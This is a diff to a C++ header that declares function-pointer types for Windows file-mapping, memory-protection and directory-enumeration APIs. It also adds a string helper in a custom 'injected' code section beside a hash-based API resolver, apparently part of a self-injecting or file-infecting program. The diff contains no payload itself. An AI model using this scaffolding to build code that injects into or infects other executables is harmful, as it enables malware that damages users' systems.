@@ -21,17 +21,17 @@ EXTERN_C_START
 #define NT_CURRENT_TEB() ((PTEB)__readgsqword(FIELD_OFFSET(NT_TIB, Self)))
 
 typedef HMODULE(WINAPI *LoadLibraryA_t)(IN LPCSTR lpLibFileName);
-typedef int(WINAPI *MessageBoxA_t)(IN OPTIONAL HWND hWnd, IN OPTIONAL LPCSTR lpText,
-                                   IN OPTIONAL LPCSTR lpCaption, IN UINT uType);
+typedef int(WINAPI *MessageBoxA_t)(IN HWND hWnd OPTIONAL, IN LPCSTR lpText OPTIONAL,
+                                   IN LPCSTR lpCaption OPTIONAL, IN UINT uType);
 typedef HANDLE(WINAPI *CreateFileA_t)(IN LPCSTR lpFileName, IN DWORD dwDesiredAccess,
                                       IN DWORD dwShareMode,
-                                      IN OPTIONAL LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+                                      IN LPSECURITY_ATTRIBUTES lpSecurityAttributes OPTIONAL,
                                       IN DWORD dwCreationDisposition, IN DWORD dwFlagsAndAttributes,
-                                      IN OPTIONAL HANDLE hTemplateFile);
-typedef DWORD(WINAPI *GetFileSize_t)(IN HANDLE hFile, OUT OPTIONAL LPDWORD lpFileSizeHigh);
+                                      IN HANDLE hTemplateFile OPTIONAL);
+typedef DWORD(WINAPI *GetFileSize_t)(IN HANDLE hFile, OUT LPDWORD lpFileSizeHigh OPTIONAL);
 typedef HANDLE(WINAPI *CreateFileMappingA_t)(
-    IN HANDLE hFile, IN OPTIONAL LPSECURITY_ATTRIBUTES lpFileMappingAttributes, IN DWORD flProtect,
-    IN DWORD dwMaximumSizeHigh, IN DWORD dwMaximumSizeLow, IN OPTIONAL LPCSTR lpName);
+    IN HANDLE hFile, IN LPSECURITY_ATTRIBUTES lpFileMappingAttributes OPTIONAL, IN DWORD flProtect,
+    IN DWORD dwMaximumSizeHigh, IN DWORD dwMaximumSizeLow, IN LPCSTR lpName OPTIONAL);
 typedef LPVOID(WINAPI *MapViewOfFile_t)(IN HANDLE hFileMappingObject, IN DWORD dwDesiredAccess,
                                         IN DWORD dwFileOffsetHigh, IN DWORD dwFileOffsetLow,
                                         IN SIZE_T dwNumberOfBytesToMap);
@@ -40,6 +40,13 @@ typedef BOOL(WINAPI *VirtualProtect_t)(IN LPVOID lpAddress, IN SIZE_T dwSize, IN
 typedef BOOL(WINAPI *FlushViewOfFile_t)(IN LPCVOID lpBaseAddress, IN SIZE_T dwNumberOfBytesToFlush);
 typedef BOOL(WINAPI *UnmapViewOfFile_t)(IN LPCVOID lpBaseAddress);
 typedef BOOL(WINAPI *CloseHandle_t)(IN HANDLE hObject);
+typedef DWORD(WINAPI *GetCurrentDirectoryA_t)(IN DWORD nBufferLength, OUT LPSTR lpBuffer OPTIONAL);
+typedef HANDLE(WINAPI *FindFirstFileA_t)(IN LPCSTR lpFileName,
+                                         OUT LPWIN32_FIND_DATAA lpFindFileData);
+typedef BOOL(WINAPI *FindNextFileA_t)(IN HANDLE hFindFile, OUT LPWIN32_FIND_DATAA lpFindFileData);
+typedef BOOL(WINAPI *FindClose_t)(IN OUT HANDLE hFindFile);
+typedef HLOCAL(WINAPI *LocalAlloc_t)(IN UINT uFlags, IN SIZE_T uBytes);
+typedef HLOCAL(WINAPI *LocalFree_t)(IN HLOCAL hMem);
 
 #pragma section("injected", read, execute)
 
@@ -81,6 +88,17 @@ __declspec(code_seg("injected")) constexpr ULONGLONG my_strhash(LPCWSTR wsName) 
         hash = MY_ROTL64(hash, 13) + my_toupper(*wsName++);
     }
     return hash;
+}
+
+__declspec(code_seg("injected")) static inline LPCSTR my_strcat(LPSTR dest, LPCSTR src) {
+    while (*dest) {
+        dest++;
+    }
+    while (*src) {
+        *dest++ = *src++;
+    }
+    *dest = '\0';
+    return dest;
 }
 
 template <ULONGLONG hash>
